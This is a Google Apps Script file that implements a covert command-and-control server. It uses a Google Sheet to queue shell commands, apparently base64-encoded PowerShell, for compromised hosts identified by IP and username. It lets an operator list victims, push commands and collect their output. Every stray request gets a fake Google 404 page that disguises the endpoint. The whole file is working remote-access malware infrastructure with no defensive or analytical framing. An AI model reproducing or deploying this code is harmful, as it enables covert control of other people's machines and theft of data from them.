// URL to spreadsheet in google drive to store data
SPREADSHEET_URL = '';
SPREADSHEET = SpreadsheetApp.openByUrl(SPREADSHEET_URL);
SHEET = SPREADSHEET.getSheets()[0];

function err() {
  // return google-like error page
  var msg = '<!DOCTYPE html><html lang=en><meta charset=utf-8><meta name=viewport content="initial-scale=1, minimum-scale=1, width=device-width"><title>Error 404 (Not Found)!</title><style>*{margin:0;padding:0}html,code{font:15px/22px arial,sans-serif}html{background:#fff;color:#222;padding:15px}body{margin:7% auto 0;max-width:390px;min-height:180px;padding:30px 0 15px}* > body{background:url(//www.google.com/images/errors/robot.png) 100% 5px no-repeat;padding-right:205px}p{margin:11px 0 22px;overflow:hidden}ins{color:#777;text-decoration:none}a img{border:0}@media screen and (max-width:772px){body{background:none;margin-top:0;max-width:none;padding-right:0}}#logo{background:url(//www.google.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png) no-repeat;margin-left:-5px}@media only screen and (min-resolution:192dpi){#logo{background:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) no-repeat 0% 0%/100% 100%;-moz-border-image:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) 0}}@media only screen and (-webkit-min-device-pixel-ratio:2){#logo{background:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) no-repeat;-webkit-background-size:100% 100%}}#logo{display:inline-block;height:54px;width:150px}</style><span id=logo aria-label=Google></span><p><b>404.</b> <ins>That’s an error.</ins><p>The requested URL was not found on this server.<ins>That’s all we know.</ins>';
  return HtmlService.createHtmlOutput(msg);
}

function get_cmd(ip, user) {
  var data = SHEET.getDataRange().getValues();
  for (var row = 0; row < data.length; row++) {
    if ((data[row][0] === ip) && (data[row][1] === user)) {
      return data[row][2];
    }
  }
  SHEET.appendRow([ip, user, 'ZQB4AGkAdAA=', '']);
  return 'ZQB4AGkAdAA='; // exit command
}

function set_cmd(ip, user, cmd) {
  var data = SHEET.getDataRange().getValues();
  for (var row = 0; row < data.length; row++) {
    if ((data[row][0] === ip) && (data[row][1] === user)) {
      SHEET.getRange(row + 1, 3).setValue(cmd);
      SHEET.getRange(row + 1, 4).setValue('');
    }
  }
}

function get_result(ip, user) {
  var data = SHEET.getDataRange().getValues();
  for (var row = 0; row < data.length; row++) {
    if ((data[row][0] === ip) && (data[row][1] === user)) {
      return data[row][3];
    }
  }
  return '';
}

function set_result(ip, user, result) {
  var data = SHEET.getDataRange().getValues();
  for (var row = 0; row < data.length; row++) {
    if ((data[row][0] === ip) && (data[row][1] === user)) {
      SHEET.getRange(row + 1, 4).setValue(result);
    }
  }
}

function doPost(e) {
  try {
    switch (Object.keys(e.parameter)[0]) {
      case 'k':
        if (e.postData.length != 0) {
          var d = Utilities.newBlob(Utilities.base64Decode(e.parameter['k'])).getDataAsString().split('|');
          set_result(d[0], d[1], e.postData.contents);
          return ContentService.createTextOutput('ok');
        } else {
          return err();
        }
      default:
        return err();
        break;
    }
  } catch (error) {
    return err();
  }
}

function doGet(e) {
  try {
    switch (Object.keys(e.parameter)[0]) {
      case 'k':
        var d = Utilities.newBlob(Utilities.base64Decode(e.parameter['k'])).getDataAsString().split('|');
        var cmd = get_cmd(d[0], d[1]);
        return ContentService.createTextOutput(cmd);
      case 'l':
        var res = [];
        var data = SHEET.getDataRange().getValues();
        for (var row = 0; row < data.length; row++) {
          res.push(data[row][0]);
          res.push(data[row][1]);
        }
        return ContentService.createTextOutput(res.join('|'));
      case 'r':
        var d = e.parameter['r'].split('|');
        set_cmd(d[0], d[1], d[2]);
        // wait until done
        while (1) {
          var r = get_result(d[0], d[1]);
          if (r != '') {
            return ContentService.createTextOutput(r);
          }
        }
      default:
        return err();
        break;
    }
  } catch (error) {
    return err();
  }
}
